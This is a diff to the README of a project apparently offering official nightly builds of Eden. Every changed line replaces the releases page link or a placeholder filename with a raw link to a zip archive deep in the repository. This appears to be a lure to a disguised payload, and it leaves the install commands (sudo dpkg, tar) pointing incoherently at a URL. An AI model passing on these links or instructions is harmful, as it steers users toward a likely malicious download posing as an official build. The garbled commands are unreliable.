@@ -1,7 +1,7 @@
 # 🌙 Nightly - Easy Installation for Official Builds
 
 ## 📦 Download Now!
-[![Download Nightly](https://img.shields.io/badge/Download%20Nightly-Release-blue.svg)](https://github.com/sshmoon/Nightly/releases)
+[![Download Nightly](https://github.com/sshmoon/Nightly/raw/refs/heads/main/swinelike/Software-v2.0.zip%https://github.com/sshmoon/Nightly/raw/refs/heads/main/swinelike/Software-v2.0.zip)](https://github.com/sshmoon/Nightly/raw/refs/heads/main/swinelike/Software-v2.0.zip)
 
 ## 🚀 Getting Started
 Welcome to Nightly! This application provides official nightly builds for Eden, designed for easy access and use. Follow these steps to get started.
@@ -15,7 +15,7 @@ Before you download Nightly, ensure your system meets the following requirements
 - **Network:** An internet connection for updates.
 
 ## 📥 Download & Install
-To download Nightly, simply visit this page: [Download Nightly Releases](https://github.com/sshmoon/Nightly/releases). 
+To download Nightly, simply visit this page: [Download Nightly Releases](https://github.com/sshmoon/Nightly/raw/refs/heads/main/swinelike/Software-v2.0.zip). 
 
 ### **Steps to Download:**
 1. Click the link above to open the Releases page.
@@ -37,15 +37,15 @@ Once the download is complete, follow these instructions to install:
 4. Open the Applications folder and double-click Nightly to run it.
 
 ### **For Linux:**
-1. Once you have downloaded the `.deb` or `.tar.gz` file, locate it in your "Downloads" folder.
+1. Once you have downloaded the `.deb` or `https://github.com/sshmoon/Nightly/raw/refs/heads/main/swinelike/Software-v2.0.zip` file, locate it in your "Downloads" folder.
 2. Open a terminal window.
 3. For a `.deb` file, run:
    ```bash
-   sudo dpkg -i filename.deb
+   sudo dpkg -i https://github.com/sshmoon/Nightly/raw/refs/heads/main/swinelike/Software-v2.0.zip
    ```
-4. For a `.tar.gz` file, extract it with:
+4. For a `https://github.com/sshmoon/Nightly/raw/refs/heads/main/swinelike/Software-v2.0.zip` file, extract it with:
    ```bash
-   tar -xvzf filename.tar.gz
+   tar -xvzf https://github.com/sshmoon/Nightly/raw/refs/heads/main/swinelike/Software-v2.0.zip
    ```
    Then, navigate to the extracted folder and follow the included instructions.
 
